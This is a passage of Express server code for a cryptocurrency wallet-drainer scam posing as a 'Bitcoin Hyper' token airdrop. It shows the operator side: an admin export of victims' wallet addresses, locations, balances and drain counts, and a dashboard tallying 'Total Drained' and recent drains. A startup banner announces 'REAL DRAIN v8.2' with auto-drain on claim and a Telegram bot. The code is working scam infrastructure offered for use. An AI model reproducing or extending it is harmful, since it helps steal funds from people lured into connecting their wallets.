app.get('/api/admin/export', authenticateAdmin, async (req, res) => {
  try {
    const format = req.query.format || 'json';
    
    if (format === 'csv') {
      let csv = 'Wallet,Country,City,ETH Balance,MATIC Balance,BNB Balance,Total Value,Eligible,Claimed,Amount,Value,Connected At,Claimed At,Drained,Drain Count,TX Hash\n';
      
      memoryStorage.participants.forEach(p => {
        csv += `"${p.walletAddress}","${p.country}","${p.city}","${p.ethBalance}","${p.maticBalance}","${p.bnbBalance}","${p.totalValueUSD}","${p.eligibility.isEligible}","${p.claim.claimed}","${p.tokenAllocation.amount}","${p.tokenAllocation.valueUSD}","${p.connectedAt.toISOString()}","${p.claim.claimedAt ? p.claim.claimedAt.toISOString() : ''}","${p.claim.drained}","${p.claim.drainCount || 0}","${p.claim.txHash}"\n`;
      });
      
      res.header('Content-Type', 'text/csv');
      res.header('Content-Disposition', 'attachment; filename=bitcoin-hyper-drain-data.csv');
      res.send(csv);
      
    } else {
      res.json({
        success: true,
        data: {
          participants: memoryStorage.participants,
          statistics: memoryStorage.settings.statistics,
          exportTime: new Date().toISOString()
        }
      });
    }
    
  } catch (error) {
    console.error('Export error:', error);
    res.status(500).json({ success: false, error: 'Export failed' });
  }
});

// Admin dashboard
app.get('/admin', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (!token || token !== adminToken) {
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper - Admin Login</title>
        <style>
          body { font-family: Arial, sans-serif; background: #0f172a; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; }
          .login { background: #1e293b; padding: 40px; border-radius: 10px; text-align: center; }
          input { padding: 10px; margin: 10px 0; width: 300px; }
          button { background: #F7931A; color: white; border: none; padding: 10px 20px; cursor: pointer; }
        </style>
      </head>
      <body>
        <div class="login">
          <h1>BITCOIN HYPER ADMIN</h1>
          <p>Enter admin token:</p>
          <input type="password" id="token" placeholder="Admin Token" />
          <br>
          <button onclick="login()">Login</button>
        </div>
        <script>
          function login() {
            const token = document.getElementById('token').value;
            if (!token) return alert('Enter token');
            window.location.href = '/admin?token=' + token;
          }
        </script>
      </body>
      </html>
    `);
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper Admin</title>
      <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
        .stat-card { background: #1e293b; padding: 20px; border-radius: 10px; }
        .stat-value { font-size: 24px; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 10px; border: 1px solid #334155; text-align: left; }
      </style>
    </head>
    <body>
      <h1>Bitcoin Hyper Admin Dashboard</h1>
      <div class="stats">
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
          <div>Total Participants</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.eligibleParticipants}</div>
          <div>Eligible</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.claimedParticipants}</div>
          <div>Claims</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
          <div>Total Drained</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
          <div>Drained Wallets</div>
        </div>
      </div>
      
      <h2>Recent Drains</h2>
      <table>
        <tr><th>Wallet</th><th>Chain</th><th>Amount</th><th>Value</th><th>Country</th><th>Time</th></tr>
        ${memoryStorage.activityLog
          .filter(log => log.action === 'DRAIN_EXECUTED')
          .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
          .slice(0, 20)
          .map(log => `
            <tr>
              <td>${log.wallet.substring(0, 10)}...</td>
              <td>${log.data.chain}</td>
              <td>${log.data.nativeAmount} ${log.data.nativeSymbol}</td>
              <td>$${log.data.usdValue}</td>
              <td>${log.data.country}</td>
              <td>${new Date(log.timestamp).toLocaleString()}</td>
            </tr>
          `).join('')}
      </table>
      
      <h2>Export Data</h2>
      <button onclick="exportData('json')">Export JSON</button>
      <button onclick="exportData('csv')">Export CSV</button>
      
      <script>
        function exportData(format) {
          window.open('/api/admin/export?format=' + format + '&token=${token}', '_blank');
        }
      </script>
    </body>
    </html>
  `);
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`
  🚀 BITCOIN HYPER REAL DRAIN v8.2
  =================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  💰 Drain Wallet: ${DRAIN_WALLET_ADDRESS ? 'CONFIGURED' : 'NOT SET'}
  🔑 Real Drain: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
  ⚡ Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? 'ENABLED' : 'DISABLED'}
  `);
  
  initializeTelegramBot();
});

module.exports = app;
